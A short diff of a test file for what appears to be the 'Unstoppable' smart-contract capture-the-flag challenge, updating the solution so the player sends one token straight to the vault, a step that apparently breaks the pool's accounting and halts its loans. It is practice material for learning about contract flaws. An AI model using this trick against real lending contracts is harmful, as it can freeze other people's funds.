@@ -45,8 +45,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        this.token = await this.token.connect(attacker);
-        await this.token.transfer(this.pool.address, 1);
+        token = await token.connect(player);
+        await token.transfer(vault.address, 1);
         
     });
 
